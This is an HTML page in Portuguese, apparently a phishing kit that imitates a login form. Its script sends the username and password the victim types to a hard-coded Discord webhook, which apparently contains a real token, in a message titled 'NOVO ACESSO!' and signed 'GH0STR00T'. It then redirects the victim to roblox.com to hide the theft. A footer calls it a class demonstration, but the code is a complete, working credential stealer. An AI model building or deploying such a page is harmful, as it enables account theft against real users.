<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Laboratório de Programação - Teste de Login</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            width: 350px;
            text-align: center;
        }
        h2 { color: #333; margin-bottom: 20px; }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #0078d4;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
        }
        button:hover { background-color: #005a9e; }
        .footer { margin-top: 15px; font-size: 12px; color: #777; }
    </style>
</head>
<body>

<div class="login-container">
    <h2>Entrar no Sistema</h2>
    <input type="text" id="username" placeholder="Nome de usuário">
    <input type="password" id="password" placeholder="Senha">
    <button onclick="enviarParaWebhook()">Login</button>
    
    <div class="footer">
        Apenas para fins demonstrativos (Aula de TI)
    </div>
</div>

<script>
    function enviarParaWebhook() {
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;
        const webhookURL = "https://discord.com/api/webhooks/1495993264635904051/8MyNvYn9qsFMh44kkgHg11nf7v7BoACoim1eKPBvdbeeVQn7wmVN355wyqv1c94-uyTO";

        // Formatação da mensagem conforme seu pedido
        const payload = {
            content: null,
            embeds: [{
                title: "😈😈NOVO ACESSO!",
                description: "FEITO POR: GH0STR00T",
                color: 16711680, // Cor vermelha em decimal
                fields: [
                    { name: "USERNAME:", value: `*${user}*`, inline: false },
                    { name: "SENHA:", value: `*${pass}*`, inline: false },
                    { name: "ACESSO EM:", value: `*${new Date().toLocaleString()}*`, inline: false }
                ]
            }]
        };

        if (user === "" || pass === "") {
            alert("Por favor, preencha todos os campos.");
            return;
        }

        fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(() => {
            alert("Dados enviados para o seu bot com sucesso!");
            // Redireciona para o site oficial após o envio para demonstrar como o golpe engana o usuário
            window.location.href = "https://roblox.com";
        })
        .catch(err => {
            console.error("Erro ao enviar:", err);
            alert("Erro na conexão com o Webhook.");
        });
    }
</script>

</body>
</html>
